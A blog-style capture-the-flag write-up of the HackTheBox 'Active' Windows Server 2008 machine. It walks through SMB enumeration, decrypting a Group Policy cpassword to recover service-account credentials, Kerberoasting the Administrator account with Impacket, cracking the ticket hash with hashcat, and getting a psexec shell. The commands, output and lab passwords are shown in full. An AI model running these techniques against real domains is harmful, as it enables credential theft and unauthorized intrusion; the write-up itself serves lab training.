---
title: "HackTheBox - Active"
author: Nasrallah
description: ""
date: 2023-03-11 00:00:00 +0000
categories : [HackTheBox, Machines]
tags: [hackthebox, windows, easy, smb, kerberos, kerberoasting, hashcat, cracking, impacket, psexec]
img_path: /assets/img/hackthebox/machines/active
---

<div align="center"> <script src="https://www.hackthebox.eu/badge/565048"></script> </div>

---

![](0.png)


## **Description**

Hello hackers, I hope you are doing well. We are doing [Active](https://app.hackthebox.com/machines/) from [HackTheBox](https://www.hackthebox.com). This is a windows server 2008 machine where we find group policy file in one of the readable shares in an smb share, the file contains a username and a password that allows us to make a kerberoasting attack to get the administrator hash that we crack to get into the machine

## **Enumeration**

### nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.


```terminal
Nmap scan report for 10.10.10.100                                                                                                                       [3/89]
Host is up (0.92s latency).                                                                                                                                   
Not shown: 982 closed tcp ports (reset)                                                                                                                       
PORT      STATE SERVICE       VERSION                                                                                                                         
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-03-11 08:01:13Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49165/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2023-03-11T08:02:12
|_  start_date: 2023-03-11T07:55:03
| smb2-security-mode: 
|   210: 
|_    Message signing enabled and required
```

There are a bunch of open ports on this windows server 2018 box.

We have DNS on 53/tcp, kerberos is listening on port 88, ldap on 389 revealing the domain `active.htb` and SMB is on port 445 

### SMB

Let's list the smb shares.

```bash
$ smbmap -H 10.10.10.100   
[+] IP: 10.10.10.100:445        Name: 10.10.10.100                                      
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    NO ACCESS       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share 
        Replication                                             READ ONLY
        SYSVOL                                                  NO ACCESS       Logon server share 
        Users                                                   NO ACCESS                                          
```

We see multiple shares here but the only one we can read is `Replication`.

Let's connect to the share and see what we can find.

![](1.png)

We found the file `groups.xml` which is a group policy file that stores local account information such us account names and passwords.

```xml
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>   
```

To extract the username and password from the file, we can use this tool [gpp-decrypt](https://github.com/t0thkr1s/gpp-decrypt)

```bash
$ python gpp-decrypt.py -f Groups.xml

                               __                                __ 
  ___ _   ___    ___  ____ ___/ / ___  ____  ____  __ __   ___  / /_
 / _ `/  / _ \  / _ \/___// _  / / -_)/ __/ / __/ / // /  / _ \/ __/
 \_, /  / .__/ / .__/     \_,_/  \__/ \__/ /_/    \_, /  / .__/\__/ 
/___/  /_/    /_/                                /___/  /_/         

[ * ] Username: active.htb\SVC_TGS
[ * ] Password: GPPstillStandingStrong2k18
```

With those credentials we can enumerate users with impacket `GetADUsers.py`.

```bash
$ GetADUsers.py -all active.htb/svc_tgs -dc-ip 10.10.10.100                                                                                          2 ⨯
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

Password:
[*] Querying 10.10.10.100 for information about domain.
Name                  Email                           PasswordLastSet      LastLogon           
--------------------  ------------------------------  -------------------  -------------------
Administrator                                         2018-07-18 20:06:40.351723  2023-03-11 08:56:03.886941 
Guest                                                 <never>              <never>             
krbtgt                                                2018-07-18 19:50:36.972031  <never>             
SVC_TGS                                               2018-07-18 21:14:38.402764  2018-07-21 15:01:30.320277 
```

We can also try to get a shell using `psexec`.

```bash
$ psexec.py active.htb/svc_tgs@10.10.10.100 
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

Password:
[*] Requesting shares on 10.10.10.100.....
[-] share 'ADMIN$' is not writable.
[-] share 'C$' is not writable.
[-] share 'NETLOGON' is not writable.
[-] share 'Replication' is not writable.
[-] share 'SYSVOL' is not writable.
[-] share 'Users' is not writable.
```

That didn't work.

## **Foothold**

### Kerberoasting

Using the `GetUserSPNs.py` script from Impacket, we'll do a kerberoasting attack against the box to get a list of service usernames associated with normal user accounts and also get a ticket encrypted with the user's password hash that we can use to get a password.

![](2.png)

The script identified the The SPN `active/CIFS:445` Which is associated with the user `administrator`. The script then tryed to authenticate to the service by contacting the DC, the latter responded with a ticked encrypted using the administrator's password hash. Instead of submitting the ticket to the service, the script saved it to be then cracked by the attacker and get the passwrod.

### hashcat

Let's crack the hash using `hashcat`.

```terminal
 $ hashcat -m 13100 adm.hash /usr/share/wordlists/rockyou.txt                                                                                                               hashcat (v6.1.1) starting...                                                                                                                                                                                                                                                                                                                                    OpenCL API (OpenCL 1.2 pocl 1.6, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]                                                   =============================================================================================================================         
* Device #1: pthread-Intel(R) Core(TM) i5 CPU       M 520  @ 2.40GHz, 2727/2791 MB (1024 MB allocatable), 4MCU
                                            
Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
                                                                                        
Hashes: 1 digests; 1 unique digests, 1 unique salts  
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1                                                                                
                                            
Applicable optimizers applied:                                                          
* Zero-Byte                             
* Not-Iterated                                                                          
* Single-Hash                        
* Single-Salt                                                                           
                                                                                        
Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 134 MB 

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$f892687700b9adaee50e50ffa8f16458$116aa1f0ecc65ea6383ec4c863c82ad1cb345fb6b8fced2246a87d50eb60c8ee5e4af9f8c6467b833a366c1f676d9c0b15173d7d1254f9247901c8368628687b527928ccd3e0b9d6a8ced4985837637b17bb8c6c5788d7427901ebb64ab4280d758c13217f7fe951a440c31a07ade34e5a70c77b930da88aefcc0cf1ccc5c52d93e3f0f88414985fb8fdb64c05b04b47edc5983185936430708502044267ef1761622f21b853936e2f5c96c47be07e7b140330ec96b14815a1d639a9995a0e9b4b31edcb58ac3fcfac5e3c077ea781b1d99ab47b95c12478cb277915a28889f16cfd8243de13ae4a1e69919653c00abd156139f58316137d098a05b5abc1e621cca10954d966b9ce6afb20c28406a01726eb677134b55ea9d8e9dc182fe2b3ea09688e74672c4a6638d6dc895dc4250c27c40af16048aaf20730264e405f7685d9e3eb5d303771b6f8b4f6c79cf67efcb93563608a2fede745ceaea256ccc52a6be5d4ae71af7bfe1fc7627c59a571c3fdf0154d2fb28d2f1703b9b8b5f667d4160aa40db9a8c0ae6e2c43905baaadaab185939a28441bb17585d3dfa94d1e8fbeba98610ad5bf141db969b15f89bd90a295f84ab477ddd3d025cb554ce6ff8fd6188132f78a3eef5bbadd04707d6cc9fed8035338451450dfe85c2ef1ee1e0f3f839c5396aa9f98f2406c7722b3f5540a9f3632b97dd54367a9a58b4411ed478b9fa9a8969c7a4457b1e17e3626b5d8ad1b6aa6d7d22548bef28902f5335ad1098ab4a841ffba077b67cc7f88b9a119e2636c6b0de4f521bb81b6fee7ac8cca217984f51d8c1138a7de1b062274c96e8d4773c049899fb33915b8d17a85f7621efb875357435094cf4d8a835fff7de63673656f0e6fca2113a6d28e19e23e4a255de699f01ae62e8ca5a21ab5bd65fe60458b38314132075ad43a5eed9f35d3dbd7f2381e71f740af4755e35cbb0b90cb361bf3aba11f12b0f463242b924d98369af4db486678ebc43f2a98772ffce1c9bb6a79c3e22e9e54675a4ec1375be48d7fd8b51ad3b073fb1ddf9fc2b06e3ddeb3d92d1c9af9b1d7bb9fe38dbcb0d7cf9c50a9599d9926357bfb46d0b460ba63353bc25b98a51c8e567c4bef79cbafd79a0085b2e9c0b0d531693b1ae4baeb39a4235f6ecb020603765a4c287c8ea09961f4abfa36352d4a1bd80118cf43b9f8666b5201677ff1b2d7a5cb0e8625f1dcc026696de3bbd81b8c05632b31565932df148af726410a795a:Ticketmaster1968
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: Kerberos 5, etype 23, TGS-REP
Hash.Target......: $krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Ad...0a795a
Time.Started.....: Sat Mar 11 12:28:37 2023 (31 secs)
Time.Estimated...: Sat Mar 11 12:29:08 2023 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   343.2 kH/s (7.24ms) @ Accel:32 Loops:1 Thr:64 Vec:4
Recovered........: 1/1 (100.00%) Digests
Progress.........: 10543104/14344385 (73.50%)
Rejected.........: 0/10543104 (0.00%)
Restore.Point....: 10534912/14344385 (73.44%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: Tioncurtis23 -> Teague51

Started: Sat Mar 11 12:28:29 2023
Stopped: Sat Mar 11 12:29:10 2023

```

We got the admin hash, now let's get a shell using `psexec`

![](3.png)

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).
